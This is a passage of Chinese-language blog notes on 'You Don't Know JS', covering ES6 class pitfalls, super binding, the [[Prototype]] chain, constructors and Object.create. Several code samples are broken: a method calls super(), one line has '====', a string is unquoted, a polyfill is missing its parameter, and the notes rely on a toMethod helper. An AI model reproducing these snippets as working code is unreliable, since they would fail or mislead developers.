this.count++ 的话，我们很惊讶地发现在对象 c1 和 c2 上都创建了 .count 属性，而不是更新共享状态。class没有办法解决这个问题，并且干脆就不提供相应的语法支持，所有根本就不应该这样做。 此外，class 语法仍然面临意外屏蔽的问题： 1234567891011class C&#123; constructor(id)&#123; // 我们的id属性屏蔽了 id 方法 this.id = id; &#125; id()&#123; console.log(id) &#125;&#125;var c1 = new C();c1.id(); // TypeError 除此之外，super 也存在一些细微的问题，你可能认为 super 的绑定方法和 this 类似，也就是说，无论目前的方法在原型链中处于什么位置，super 总会绑定到链的上一层。 然而，处于性能的考虑，super 并不是动态绑定到，它会在声明时“静态”绑定。如果你会用许多不同的方法把函数应用在不同的对象上，那你可能不知道，每次执行这些操作时都必须重新绑定 super。 此外，根据应用方式的不同，super 可能不会绑定到合适的对象，所以你可能需要 用 toMethod(..) 来手动绑定 super。你习惯了把方法应用到不同的对象上，从而可以自动利用 this 的隐式绑定规则，但是 super 是行不通的。 123456789101112131415161718192021222324class P&#123; foo()&#123; console.log("P.foo"); &#125;&#125;class C extends P&#123; foo()&#123; super(); &#125;&#125;var c1 = new C();C1.foo(); // "P.foo"var D = &#123; foo:function()&#123; console.log("D.foo"); &#125;&#125;var E = &#123; foo:C.prototype.foo&#125;// 把 E 委托到 DObject.setPrototypeOf(E,D);E.foo(); // "P.foo" 你可能会认为 super 会动态绑定，那么可能期望 super() 会自动识别出 E 委托了 D，所以E.foo() 中的 super 应该调用 D.foo()。 但事实并不是这样的，处于性能考虑，super 并不像 this 一样是晚绑定（lated bound，或者说动态绑定）的，它在 [[HomeObject]].[[Prototype]] 上，[[HomeObject]] 会在创建时静态绑定。 在上面的例子中，super() 会调用 P.foo() ，因为方法的 [[HomeObject]] 仍然是 C,C.[[Prototype]] 是 P。确实可以手动修改 super 绑定，使用 toMethod(..) 绑定或者重新绑定方法的 [[HomeObject]]（就像设置 [[Prototype]] 一样）就可以解决上面的问题： 1234567891011var D = &#123; foo:function()&#123; console.log("D.foo"); &#125;&#125;// 把 E 委托到 Dvar E = Object.create(D);// 手动把 foo 的 [[HomeObject]] 绑定到 E，E.[[Prototype]] 是 D，所以 super() 是 D.foo() E.foo = C.prototype.foo.toMethod(E,"foo");E.foo(); // "D.foo" toMethod（..） 会复制方法并把 homeObject 当做第一个参数（也就是我们传入的 E）,第二个参数（可选）是新方法的名称（默认是原方法名） 除此之外，开发者有可能会遇到其他问题，这有待观察，无论如何，对于引擎自动绑定的 super 来说，你必须时刻警惕是否需要进行手动绑定。 静态大于动态吗？通过上面的这些特性可以看出，ES6 的 class 最大问题在于，（像传统的类一样）它的语法有时会让你认为，定义了一个 class 后，它就变成了一个（未来会被实例化）东西的静态定义。你会彻底忽略C是一个对象，是一个具体的可以直接交互的东西。 在传统的面向类的语言中，类定义之后就不会进行修改，所以类的设计模式就不支持修改。但是 JavaScript 是最强大的特性之一就是它的动态性，任何对象的定义都可以修改（除非你想设置为不可变的）。 class 似乎不赞成这样子做，所以强制让你使用丑陋的 .prototype 语法以及 super 问题等等，而且这种动态产生的问题，class 基本上没有提供解决方案。 总体来说，ES6 的 class 想伪装成一种很好的语法问题的解决方案，但是实际上却让问题更难解决而且让 JavaScrip 更加难以理解了。 如果你使用 .bind() 函数来硬绑定函数，那么这个函数不会像普通函数那样被 ES6 的 extend 扩展于 子类中 小结class 很好地伪装成 JavaScript 中类和继承设计模式的解决方案。但是它实际上起到了反作用：它隐藏了许多问题并且带来了更多更细小的但是很危险的问题。 class加上了过去20年对于 JavaScript 中 “类”的误解，在某些方面，它产生的问题比解决的还要多，而且让本来优雅简洁的 [[Prototype]] 机制变得非常别扭。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>你不知道的JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你不知道的JavaScript(上)——原型]]></title>
    <url>%2F2019-01-22-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript(%E4%B8%8A)%E2%80%94%E2%80%94%E5%8E%9F%E5%9E%8B.html</url>
    <content type="text"><![CDATA[这个系列的作品是上一次当当网有活动买的，记得是上一年九月份开学季的时候了。后面一直有其他的事情，或者自身一些因素，迟迟没有开封这本书。今天立下一个 flag，希望可以在两个月内看完并记录这个系列的三本书，保持学习的激情，不断弥补自己的基础不够扎实的缺点。 作者的github 书籍的购买链接，自己搜。 你不知道的JavaScript(上)——原型上一章讲了对象，下面介绍和类相关的对象编程，在研究类的具体机制之前，先介绍面向类的设计模式：实例化（instantitation）、继承（inheritance）和（相对）多态（polymorphism） 可以看到，这些概念实际上无法直接对应到 JavaScript 的对象机制，因为会介绍许多 JavaScript 开发者所使用的解决方法（比如混入，mixin） [[Prototype]]JavaScript 中的对象有一个特殊的 [[Prototype]]内置属性，其实就是对于其他对象的引用。几乎所有的对象在创建的时候 [[Prototype]] 属性都会被赋予一个非空的值。 注意：很快我们就可以看到，对象的 [[Prototype]] 链接可以为空，虽然很少见 1234var myObject = &#123; a:2&#125;myObject.a; // 2 [[Prototype]] 引用有什么用？当你试图引用对象的属性时会触发 [[Get]] 操作，比如 myObject.a。对于默认的 [[Get]] 操作来说，第一步是检查对象本身是否有这个属性，如果有就使用它。 ES6 中的 Proxy，如果包含这个的话，这里对于 [[Get]] 和 [[Put]] 的讨论就不适用。 但是如果 a 不在 myObject中，就需要使用对象的 [[Prototype]] 链了。 对于默认的 [[Get]] 操作来说，如果无法在对象本身找到需要的属性，就会继续访问对象的 [[Prototype]] 链： 123456var anotherObject = &#123; a:2&#125;// 创建一个关联到 anotherObject 的对象var myObject = Object.create(anotherObject);myObject.a; // 2 Object.create(…) 会创建一个对象并把这个对象的 [[Prototype]] 关联到指定的对象 现在 myObject 对象的 [[Prototype]] 关联到了 anotherObject。显然 myObject.a 并不存在，但是尽管如此。属性仍然成功地（在 anotherObject中）找到了值2. 但是，如果 anotherObject 也找不到 a 并且 [[Prototype]] 不为空的话，就会继续查找下去。 这个过程会持续到找到匹配的属性名或者完整的条 [[Prototype]] 链，如果是后者的话，[[Get]] 操作的返回值就是 undefined. 使用 for..in 遍历对象时原理和查找 [[Prototype]] 链类似，任何可以通过原型链访问到的（并且是 enumerable）的属性都会被枚举。使用 in 操作符检查属性在对象中是否存在时，同样会查找对象的整条原型链（无论属性是否可以枚举）： 12345678910var anotherObject = &#123; a:2&#125;// 创建一个关联到 anotherObject 的对象var myObject = Object.create(anotherObject);for(var k in myObject)&#123; console.log('found:'+k);&#125;// found:a("a" in myObject); // true 因为，当你通过各种语法进行属性检查时都会查找 [[Prototype]] 链，知道找到属性或者查找完整条原型链 Object.prototype但是到哪里是 [[Prototype]] 的尽头呢？ 所有普通的 [[Prototype]] 链最终都会指向内置的 Object.prototype 。由于所有的 “普通”（内置。不是特定主机的扩展）对象都“源于”（或者说 把 [[Prototype]] 的顶端设置为）这个 Object.prototype 对象，所以包含 JavaScript 中通用的功能。 比如说：.toString() 或者 .valueOf()，.hasOwnProperty() 和 .isPrototype()等等。 属性设置和屏蔽给一个对象设置属性不仅仅是添加一个新属性或者修改已有的属性值。 1myObject.foo = "bar"; 如果 myObject 对象中包含名为 foo 的普通数据访问属性，这条赋值语句就会修改已有的属性值。 如果 foo 不是直接存在于 myObject 中，[[Prototype]] 链就会被遍历，类似 [[Get]] 操作，如果原型链上找不到 foo ，foo 就会被直接添加到 myObject 上。然而，如果foo 存在于原型链上层，那么赋值语句的行为就会有些不同了。 然后，如果 foo 存在于myObject 中也出现在 myObject 的 [[Prototype]] 链上层，那么就会发生屏蔽。myObject 包含的 foo 属性会屏蔽原型链上层的所有 foo 属性，因为 myObject.foo 总是会选择原型链中最底层的 foo 属性。 屏蔽比我们想象中要更加复杂，下面分析一下如果 foo 不直接存在于 myObject 中而是存在于原型链上层时 myObject.foo = “bar” 会出现的三种情况： 如果在 [[Prototype]] 链上层存在名为 foo 的普通数据访问属性并且没有被标记只读（writable:false），那就会直接在 myObject 中添加一个名为 foo 的新属性，它是屏蔽属性 如果在 [[Prototype]] 链上层存在 foo,但是它被标记为只读（writable:false），那么无法修改已有属性或者在 myObject 上创建屏蔽属性。如果运行在严格模式下，代码会抛出一个错误，否则，这条赋值语句会被忽略，总之，不会发生屏蔽。 如果在 [[Prototype]] 链上层存在 foo并且它是一个 setter，那就一定会调用这个 setter,foo 不会被添加到（或者说屏蔽于）myObject,也不会重新定义 foo 这个 setter。 大部分开发者都认为如果向 [[Prototype]] 链上层已经存在的属性([[Put]]) 赋值，就一定会触发屏蔽，但是如你所见，三种情况中只有一种（第一种）是这样的。 如果你希望在第二种和第三种情况下也屏蔽 foo，那就不能使用 = 操作符来赋值，而是使用 Object.defineProperty(..) 来向 myObject 添加 foo。 第二种情况是最令人以外的，只读属性会阻止 [[Prototype]] 链下层隐式创建（屏蔽）同名属性，这样做的主要是为了模拟类属性的继承。你可以把原型链上层的 foo 看到是父类的属性，它会被 myObject 继承（复制），这样一来 myObject 中的 foo 属性也是只读的，所以无法创建。但是一定要注意，实际上并不会发生类似的继承复制。这看起来有点奇怪，myObject 对象竟然会因为其他对象中有一个只读 foo 就不能包含 foo 属性，更奇怪的是，这个限制只存在 于 = 赋值中，使用 Object.defineProperty(..) 并不会受到影响 如果需要对屏蔽方法进行委托的话就不得不使用丑陋的显式伪多态。通常来说，使用屏蔽得不偿失，所以应当尽量避免使用。后面会介绍一种不使用屏蔽的更加简洁的设计模式。 有些情况下也会隐式产生屏蔽，思考下面的代码： 1234567891011121314var anotherObject = &#123; a:2&#125;// 创建一个关联到 anotherObject 的对象var myObject = Object.create(anotherObject);anotherObject.a; // 2myObject.a; // 2anotherObject.hasOwnProperty("a"); // truemyObject.hasOwnProperty("a"); // falsemyObject.a++; // 隐式屏蔽anotherObject.a; // 2myObject.a; // 3myObject.hasOwnProperty("a"); // true 尽管 myObject.a++ 看起来应该（通过委托）查找并增加 anotherObject.a 属性，但是别忘了 ++ 操作相当于 myObject.a = myObject.a + 1.因为 ++ 操作首先通过 [[Prototype]] 查找属性 a 并从 anotherObject.a 获取当前的属性值2，然后给这值加1，接着用 [[Put]] 将值3赋给 myObject 中新建的屏蔽属性 a 。 修改委托属性时一定要小心，如果想让 anotherObject.a 的值增加，唯一的方法是 anotherObject.a++； “类”为什么一个对象需要关联到另一个对象？这样的好处是什么？但是在回答这个问题之前我们应知道 [[Prototype]] 不是什么？ 前面说过，JavaScript 和面向类的语言不同，它并没有类作为对象的抽象模式或者说蓝图，实际上，JavaScript 才应该真正被称为 “面向对象”的语言，因为它是少有的可以不通过类，直接创建对象的语言。在 JavaScript 中，类无法描述对象的行为（因为根本就不存在类）对象直接定义自己的行为，JavaScript 中只有对象。 “类”函数多年以来，JavaScript 中有一种奇怪的行为一直被滥用，那就是模仿类。 这种奇怪的 “类似类”的行为利用了函数的一种特殊特性：所有的函数都默认会拥有一个名为 prototype 的共有的并不可枚举的属性，它会指向另一个对象，这个对象正是调用该构造函数而创建的实例的原型。原型指的是每个 JavaScript 对象在创建的时候会与之关联的另一个对象，这个对象就是原型，每一个对象都会从原型中“继承”属性。 1234function Foo()&#123; //...&#125;Foo.prototype; // &#123;&#125; 这个对象通常被称为 Foo 的原型，因为我们通过名为 Foo.prototype 的属性引用来访问它。 那么找个对象是什么？ 最直接的解释就是，通过调用 new Foo() 创建的每个对象都最终（有点武断）被 [[Prototype]] 链接到这个 “Foo.prototype” 对象。 12345function Foo()&#123; //...&#125;var a = new Foo();Object.getPrototypeOf(a) === Foo.prototype; // true 使用 new Foo() 时会创建 a ,其中一步就是将 a 内部的 [[Prototype]] 链接到 Foo.prototype 所指向的对象。 在面向类的语言中，类可以被复制（或者说实例化）多次，就像用模具制作东西一样，之所以会这样是因为实例化（或者继承一个类）就意味着“把类的行为复制到物理对象中”，对于每一个新实例来说都会重复这个过程。 但是在 JavaScript 中，并没有类似的复制机制，你不能创建一个类的多个实例，只能创建多个对象，它们的 [[Prototype]] 关联的是同一个对象，但是在默认的情况下并不会复制，因为这些对象之间并不会完全失去联系，它们是互相关联的。 new Foo() 会生成一个新对象（我们称之为 a）,这个新对象的内部链接 [[prototype]] 关联的是 Foo.prototype 对象。 最后我们得到了两个对象，它们之间互相关联，我们并没有初始化一个类，实际上我们并没有从 “类”中复制任何一个行为到一个对象中，只是让两个对象互相关联。 实际上，绝大多数 JavaScript 开发者不知道的秘密是，new Foo() 这个函数调用实际上并没有直接创建关联，这个关联只是一个意外的副作用。new Foo() 只是间接完成了我们的目标：一个关联到其他对象的新对象。 那么有没有更直接的方法来做到这一点呢？当然，功臣就是 Object.create()。后面会介绍它。 关于名称在 JavaScript 中，我们并不会将一个对象（“类”）复制到另一个对象（实例），只是将它们关联起来，从数据角度来说，[[Prototype]] 机制如下图所示： 123(b1)-- --(a1) |---&gt;(Bar.prototype)---&gt;(Foo.prototype)&lt;---|(b2)-- --(a2) 这个机制通常被称为原型继承，它常常被视为动态语言版本的类继承，这个名称主要是为了对应面向类的世界中继承的一样，但是违背了动态脚本对应的语义。 “继承”这个词会让人产生非常强的心理预期，仅仅在前面加上“原型”并不能区分出 JavaScript 和类继承几乎完全相反的行为。 继承意味着复制操作，JavaScript （默认）并不会复制对象属性，相反，JavaScript 会在两个对象之间创建一个关联，这样一个对象就可以通过委托访问另一个对象的属性和函数。委托这个术语可以更加准确地描述 JavaScript 中对象的关联机制。 还有个偶尔会用到的 JavaScript 术语差异继承，基本原则是在描述对象行为时，使用其不同于描述的特质。举个例子，描述汽车时你会说汽车是有四个轮子的一种交通工具，但是不会重复描述交通工具具备的通用特性（比如引擎）。 如果你把 JavaScript 中对象的所有委托行为都归结于对象本身并且把对象看作是实物的话，那就（差不多）可以理解差异继承了。默认情况下，对象并不会像差异继承那样暗示的通过复制生成，因此，差异继承也不适合用来描述 JavaScript 中的 [[Prototype]] 机制。 “构造函数”回到之前的代码： 1234function Foo()&#123; //...&#125;var a = new Foo(); 是什么让我们认为 Foo 是一个类呢？ 其中一个原因his我们看到了关键字 new ,在面向类的语言汇总构造实例时也会用到它。另一个原因是，看起来我们执行了类的构造函数方法，Foo（） 调用方式很像初始化类时类构造函数调用方式。 处理令人迷惑的“构造函数”语义外，Foo.prototype 还有另一个绝招，思考下面的代码： 123456function Foo()&#123; //...&#125;Foo.prototype.constructor ==== Foo; // truevar a = new Foo();a.constructor === Foo; // true Foo.prototype默认有一个共有的并且不可枚举的属性 .constructor，这个属性引用的是对象关联的函数。此外，我们可以看到这个 “够着函数”调用 new Foo() 创建的对象也有一个 .constructor 属性，指向“创建这个对象的函数”。 实际上 a 本身并没有 .constructor 属性，而且，虽然 a.constructor 确实指向 Foo 函数，但是这个属性并不是表示 a 由 Foo “构造”。 “类” 首字母要大写。 1.构造函数还是调用上一段代码中很容易让人认为 Foo 是一个构造函数，因为我们使用 new 来调用它并看到它 “构造” 了一个对象。 实际上,Foo 和 程序中的其他函数没有任何区别，函数本身并不是构造函数，然而，当你在普通的函数调用加上 new 关键字之后，就会把这个函数调用变成了一个 “构造函数调用”。实际上，new 会劫持所有普通函数并用构造对象的形式来调用它。举例来说： 123456function NothingSpecial()&#123; console.log(Do not mind me!);&#125;var a = new NothingSpecial();// Do not mind me!a; // &#123;&#125; NothingSpecial 只是一个普通函数，但是使用 new 调用时，它就会构造一个对象并赋值给 a，这看起来是 new 的一个副作用（无论如何都会构造一个对象），这个调用是一个构造函数调用，但是 NothingSpecial 本身并不是一个构造函数。 换句话说，在 JavaScript 中对于 “构造函数” 最准确的说法是，所有带 new 的函数调用。 函数不是构造函数，但是当且仅当使用 new 时，函数调用会变成“构造函数调用”。 技术JavaScript 开发者想要模仿类的行为： 1234567891011function Foo(name)&#123; this.name = name;&#125;Foo.prototype.myName = function()&#123; return this.name;&#125;var a = new Foo("a");var b = new Foo("b");a.myName(); // "a"b.myName(); // "b" 这段代码展示了另外两种“面向类”的技巧： this.name = name 给每个对象（也就是 a 和 b ）都添加了一个 .name 属性，有点像类实例封装的数据值 Foo.prototype.myName = .. 可能是一个更加有趣的技巧，它会给Foo.prototype 对象添加一个属性（函数），现在，a.myName() 可以正常工作，但是你可能会觉得很惊讶，这是什么原理？ 这段代码中，看起来似乎创建 a 和 b 会把 Foo.prototype 对象复制到这两个对象中，然而事实并不是这样的。 在前面介绍 默认[[Get]] 算法的时候我们介绍过 [[Prototype]]链，以及当属性不直接存在于对象中如何通过它来进行查找。 因此，在创建的过程中,a 和 b 的内部 [[Prototype]] 都会关联到 Foo.prototype 上，当 a 和 b 中都无法找到 myName 的时候，它会（通过委托）在 Foo.prototype 上找到。 回顾”构造函数“之前讨论 .constructor 属性的时候说过，a.constructor === Foo 为真意味着 a 确实有一个指向 Foo 的 .constructor 属性，但是事实并不是这样的。 实际上，.constructor 引用同样被委托给 Foo.prototype，而 Foo.prototype.constructor 默认指向了 Foo。 把 .constructor 属性指向 Foo 看作是 a 对象由 Foo “构造” 是非常容易理解的，但这只不过是一种虚假的安全感，a.constructor 只是通过默认的 [[Prototype]] 委托指向了 Foo,这和“构造”毫无关系。相反，对于 .constructor 的错误理解很容易对自己产生误导。 举例来说，Foo.prototype 的 .constructor 属性只是 Foo 函数在声明时的默认属性，如果你创建了一个新对象并替换了函数默认的 .prototype 对象引用，那么新对象并不会自动获得 .constructor 属性。 思考下面的代码： 12345function Foo()&#123;/*..*/&#125;Foo.prototype = &#123;/*..*/&#125; // 创建一个新原型对象var a1 = new Foo();a1.constructor === Foo; // falsea1.constructor === Object; // true Object(…) 并没有 “构造” a1，看起来应该是 Foo() “构造”了它。大部分开发者都认为是 Foo() 执行了构造工作，但是问题在于，如果你认为 “constructor” 表示 “由…构造”的话，a1.constructor 应该是 Foo,但是它并不是 Foo. a1 并没有 .constructor 属性，它会委托 [[prototype]] 链上的 Foo.prototype。但是这个对象也没有 .constructor 属性（不过默认的Foo.prototype 对象有这个属性！），所以它会继续委托，这次会委托链顶端的 Object.prototype，这个对象有 .constructor 属性，指向内置的 Object(..) 函数。 当然，你可以给 Foo.prototype 添加一个 .constructor 属性，不过这需要手动添加一个符合正常的不可枚举的属性。 12345678910function Foo()&#123;/*..*/&#125;Foo.prototype = &#123;/*..*/&#125; // 创建一个新原型对象// 需要在 Foo.prototype 上 “修复”丢失的 .constructor 属性// 新对象属性起到 Foo.prototype 的作用Object.defineProperty(Foo.prototype,"constructor",&#123; enumerable:false, writable:true, configurable:true, value:Foo // 让 .constructor 指向 Foo&#125;) 修复 .constructor 需要很多手动操作，所以这些工作都是源于把 “constructor” 错误地理解为 “由…构造”。 实际上，对象的 .constructor 属性默认指向一个函数，而这个函数也有一个叫做 .prototype 的引用指向这个对象。“构造函数” 和 “原型” 这两个词默认只有松散的含义，实际的值可能适用也可能不适用。最好的办法是记住 “constructor 并不表示（对象）被（它）构造” .constructor 并不是一个不可变的属性，它是不可枚举的，但是它的值是可写的（可以被修改）。此外，可以给任意的 [[Prototype]] 链中的任意对象添加一个名为 constructor 的属性或者对其进行修改，你可以任意对其赋值。 和 [[Get]] 算法查找 [[Prototype]] 链的机制一样， .constructor 属性的引用目标可能和你想的完全不同。 a1.constructor 是一个非常不可靠并且不安全的引用，通常来说要尽量避免使用这些引用。 （原型）继承我们已经看过了许多 JavaScript 程序中常用的模拟类行为的方法，但是如果没有 “继承”机制的话，JavaScript 中的类就是一个空架子。 实际上，我们了解了通常被称作原型继承的机制，a 可以 “继承” Foo.prototype 并访问 Foo.prototype 的 myName() 函数。但是之前我们只把继承看做是类和类之间的关系，并没有把它当做是类和实例之间的关系。 下面的代码使用的就是典型的 “原型风格”： 12345678910111213141516171819202122function Foo(name)&#123; this.name = name;&#125;Foo.prototype.myName = function()&#123; return this.name;&#125;function Bar(name,label)&#123; Foo.call(this,name); this.label = label;&#125;// 我们创建了一个新的 Bar.prototype 对象并关联到 Foo.prototype Bar.prototype = Object.create(Foo.prototype);// 注意，现在没有 Bar.prototype.constructor // 如果你需要这个属性的话可能需要手动修复一下它Bar.prototype.myLable = function()&#123; return this.label;&#125;var a = new Bar("a","obj a");a.myName(); // "a"a.myLabel(); // "obj a" 这段代码的核心是语法 “Bar.prototype = Object.create(Foo.prototype);’’调用 object.create(..) 会凭空创建一个“新”对象并把对象内部的 [[Prototype]] 关联到你的指定的对象（本例子是 Foo.prototype）. 换句话说，这个语法的意思就是：“创建一个新的Bar.prototype 对象并把它关联到 Foo.prototype ”。 声明 function Bar(){…}时，和其他函数一样，Bar 会有一个 .prototype 关联到默认的对象，但是这个对象并没有像我们想要的关联到 Foo.prototype,因为我们创建了一个新对象把它关联到我们希望的对象上，直接把原始的关联对象抛弃掉。 注意，下面这两种方式是常见的错误做法，实际上它们都存在一些问题： 1234// 和你想要的机制不一样Bar.prototype = Foo.prototype;// 基本上可以满足你的需求，但是可能会产生一些副作用Bar.prototype = new Foo(); Bar.prototype = Foo.prototype; 并不会创建一个关联到 Bar.prototype 的新对象，它只是让 Bar.prototype 直接引用了 Foo.prototype 的对象，因此当你执行类似 Bar.prototype.myLabel = … 的赋值语句会直接修改 Foo.prototype 对象本身。显然这不是我们想要的结果，否则根本不需要 Bar 对象，直接使用 Foo 就可以了，这样代码也会简单一些。 Bar.prototype = new Foo(); 的确会创建一个关联到 Bar.prototype 的新对象，但是它使用了 Foo(..) 的 “构造函数调用”，如果函数有些副作用（比如写日志、修改状态、注册到其他对象、给 this 添加数据属性等等）的话，就会影响新对象然后把旧对象抛弃掉，不能直接修改已有的默认对象。 如果能有一个标准并且可靠的方法来修改对象的 [[Prototype]] 关联就好了。在 ES6 之前，我们只能通过设置 __proto__属性来实现，但是这个方法并不是标准并且无法兼容所有浏览器。ES6 添加了辅助函数 Object.setPrototypeOf(..) ,可以用标准并且可靠的方法来修改关联。 我们来对比两种把 Bar.prototype 关联到 Foo.prototype 的方法： 1234// ES6 之前需要抛弃默认的 Bar.prototypeBar.prototype = Object.create(Foo.prototype);// ES6 开始可以直接修改现有的 Bar.prototypeObject.setPrototypeOf(Bar.prototype,Foo.prototype); 如果忽略掉 Object.create(..) 方法带来的轻微性能损失（抛弃的对象需要进行垃圾回收），它实际比ES6 及其之后的方法更短而且可读性更高，不过无论如何，这是两种完全不同的语法。 检查 “类”关系假设有对象 a,如何寻找对象 a 委托的对象（如果存在的话）呢？在传统的面向类的环境中，检查一个实例（JavaScript 中的对象）的继承祖先（JavaScript 中的委托关联）通常被称为内省（或者反射）。 12345function Foo()&#123; // ..&#125;Foo.prototype.blah = ....；var a = new Foo(); 我们如何通过内省找出 a 的 “祖先”（委托关联）呢？第一个方法就是站在 “类”的角度来判断： 1a instanceof Foo;// true instanceof 操作符的左边是一个普通对象，右边是一个函数，instanceof 回答的问题是：在 a 的整条 [[Prototype] 是否有 Foo.prototype 指向的对象？ 可惜，这个方法只能处理对象（a） 和 函数 （带 .prototype引用的 Foo）之间的关系。如果想要判断两个对象（比如 a 和 b ）是否通过 [[Prototype]] 链关联，只用 instanceof 无法实现。 如果使用内置的 .bind(…) 函数来生成一个硬绑定函数的话，该函数是没有 .prototype 属性的，在这样的函数上使用 instanceof 的话，目标函数的 .prototype 会代替硬绑定函数的 .prototype 。通常我们不会在 “构造函数调用” 中使用硬绑定函数，不过如果这么做的话，相对于直接调用目标函数。同理，在硬绑定函数上使用 instanceof 也相当于直接在目标函数上使用 instanceof 下面这段荒谬的代码试图站在 “类”的角度来使用 instanceof 来判断两个对象的关系： 123456789// 用来判断 o1 是否关联到（委托）o2 的辅助函数function isRelatedTo(o1,o2)&#123; function F()&#123;&#125; F.prototype = o2; return o1 instanceof F;&#125;var a = &#123;&#125;var b = Object.create(a);isRelatedTo(b,a); 在 isRelatedTo 内部声明了一个一次性函数 F,把它的 .prototype重新赋值并指向 对象 o2,然后判断 o1 是否是 F 的一个实例。显而易见，o1 实际上并没有继承 F 也不是由 F 构造的，所以这种方法非常愚蠢且容易造成误解。问题的关键在于思考的角度，强行在 JavaScript 中应用类的语义就会造成这种尴尬的局面。 下面是第二种判断 [[Prototype]] 反射的方法，它更加简洁。 1Foo.prototype.isPrototypeOf(a); // true 我们只需要一个用来判断的对象就行，isPrototypeOf 回答的问题是：在 a 的整条 [[Prototype] 是否有 出现过 Foo.prototype 。 我们只需要两个对象就可以判断它们之间的关系，前者的prototype 会自动被访问 1b.isPrototypeOf(a); 我们也可以直接获取一个对象的 [[Prototype]] 链，在 ES5 中，标准的方法是： 12Object.getPrototypeOf(a);Object.getPrototypeOf(a) === Foo.prototype; // true 绝大多数的浏览器也支持一种非标准的方法来访问内部的 [[Prototype]] 属性 1a.__proto__ === Foo.prototype; // true 这个奇怪的 __proto__在 ES6 之前不是标准的属性神奇地引用了内部的 [[Prototype]] 对象，如果你想直接查找原型链的话，这个非常有用。和我们说过的 .constructor 一样， __proto__ 实际上并不存在与正在使用的对象中，实际上，它和其他常用的函数（toString()、isPrototypeOf() 等等）一样，都存在于内置的 Object.prototype 中（它们是不可枚举的）。 此外， __proto__ 很像一个属性，但是实际上它更想一个 getter/setter。它的内部实现大致是这样的 12345678910Object.defineProperty(Object.prototype,"__proto__",&#123; get:function()&#123; return Object.getPrototype(this); &#125;, set:function()&#123; // ES6 中的方法 Object.setPrototypeOf(this,o); return o; &#125;&#125;); 因此，访问（获取值） a.__proto__的时候，实际上是调用了 a.__proto__ ()（调用了 getter 函数）。虽然 getter 函数存在于 Object.prototype对象中，但是它的 this 指向了对象a。所以和 Object.getPrototypeOf(a) 结果相同。 __proto__ 是可设置属性，之前的代码使用 ES6 的 Object.setPrototypeOf(..)进行设置。然而，通常来说不需要修改已有对象的 [[Prototype]]。 我们只有在一些特殊情况下，需要设置函数默认 .prototype 对象的 [[Prototype]] ，让它引用其他对象（除了 Object.prototype）。这样可以避免使用全新的对象替换默认对象。此外，最好把 [[Prototype]] 对象关联看作是只读特性，从而增加代码的 可读性。 对象关联 [[Prototype]] 机制技术存在于对象中的一个内部链接，它会引用其他对象。 通常来说，这个链接的作用是：如果在对象上没有找到需要的属性或者方法引用，引擎就会继续在 [[Prototype]] 关联的对象上进行查找，同理，如果在后者中也没有找到需要的引用就会继续查找它的 [[Prototype]] ，依次类推。这一系列对象的链接被称为 “原型链”。 创建关联用 [[Prototype]] 机制的意义是什么？为什么 JavaScript 开发者费这么大力气在代码中创建这些关联？ 1234567var foo = &#123; something:function()&#123; console.log("Tell me something good..."); &#125;&#125;var bar = Object.create(foo);bar.something(); // Tell me something good... Object.create(..) 会创建一个新对象并把它关联到我们指定的对象中，这样我们就可以充分发挥 [[Prototype]] 的威力（委托）并且避免不必要的麻烦（比如使用 new 构造函数调用会生成 .prototype 和 .constructor 引用）。 Object.create(null)会创建一个 拥有空（或者说 null） [[Prototype]] 链接的对象，这个对象无法进行委托。由于这个对象没有原型链，所以 instanceof 操作符无法进行帕努安东尼，因此总会返回 false.这些特殊的 [[Prototype]] 对象通常被称为字典，它们完全不会受到原型链的干扰，因此非常适合用来存储数据 我们并不需要类创建两个对象之间的关系，只需要通过委托来关联对象就足够了。而Object.create(..) 不包含任何类的诡计，所以它可以完美地创建我们想要的关联关系。 Object.create()的 polyfill 代码 Object.create(..) 是在 ES5 中新增的函数，所以在这之前如果要支持这个功能的话就需要一些简单的 polyfill 代码，它部分实现了 Object.create(null) 的功能： 1234567if(!Object.create)&#123; Object.create = function()&#123; function F()&#123;&#125; F.prototype = o; return new F(); &#125;&#125; 这段代码使用了一个一次性的函数 F,我们改写了它的.prototype 属性使其指向想要关联的对象，然后再使用 new F() 来构造一个新对象进行关联。 由于Object.create(..) 可以被模仿，因此这个函数被应用得非常广泛，标准的ES5 内置的Object.create(..) 函数还提供了一系列附加功能，但是 ES5 之前的版本不支持这些功能，通常来说，这些功能的范围要小得多，但是由于完整性考虑，还是介绍一下： 1234567891011121314151617181920var anotherObject = &#123; a:2&#125;var myObject = Object.create(anotherObject,&#123; b:&#123; enumerable:false, writable:true, configurable:false, value:3 &#125;, c:&#123; enumerable:true, writable:false, configurable:false, value:4 &#125;, &#125;);myObject.hasOwnProperty("a"); // falsemyObject.hasOwnProperty("b"); // truemyObject.hasOwnProperty("c"); // true Object.create(..) 的第二个餐胡搜指定了需要添加到新对象中的属性名以及这些属性的属性描述符。因为 ES5 之前的版本无法模拟属性操作符，所以 pilyfill 代码无法实现这个附加功能。 通常来说并不会使用Object.create(..) 的附加功能，所以对于很多人来说，上面的那段 polyfill 代码就足够了。 有些开发者更加严谨，他们认为只有能被完全模拟的函数才应该使用 polyfill 代码由于 Object.create(..) 是只能部分模拟的函数之一，所以这些狭隘的人认为如果你需要在 ES5 之前的环境中使用 这个功能的特性，那不要使用 polyfill 代码，而是使用给一个自定义函数并名字不是 Object.create 。你可以把你自己的函数定义成这样： 12345678910function createAllLinkObject(o)&#123; function F()&#123;&#125; F.prototype = o; return new F();&#125;var anotherObject = &#123; a:2&#125;var myObject = createAllLinkObject(anotherObject);myObject.a; // 2 关联关系是备用看起来对象之间的关联是处理“缺失”属性或者方法时的一种备用选项。这个说法有点道理，但是作者认为这并不是 [[Prototype]] 的本质： 1234567var anotherObject = &#123; cool:function()&#123; console.log("cool!"); &#125;&#125;var myObject = Object.create(anotherObject);myObject.cool(); // cool! 由于存在[[Prototype]] 机制，这段代码可以正常运行，但是如果你这样写只是为了让 myObject 在无法处理属性或者方法的时候可以使用备用的 anotherObject，那么你的软件就会变得有点神奇，而且很难理解和维护。 这并不是说任何情况下都不应该选择备用这种设计模式，但是在 JavaScript 中并不是很常见。所以你使用的是这种模式，那么或许应该退后一步重新思考一下这种模式是否合适。 你可以让你的 API设计不那么神奇，同时也可以发挥[[Prototype]] 关联的威力 12345678910var anotherObject = &#123; cool:function()&#123; console.log("cool!"); &#125;&#125;var myObject = Object.create(anotherObject);myObject.doCool = 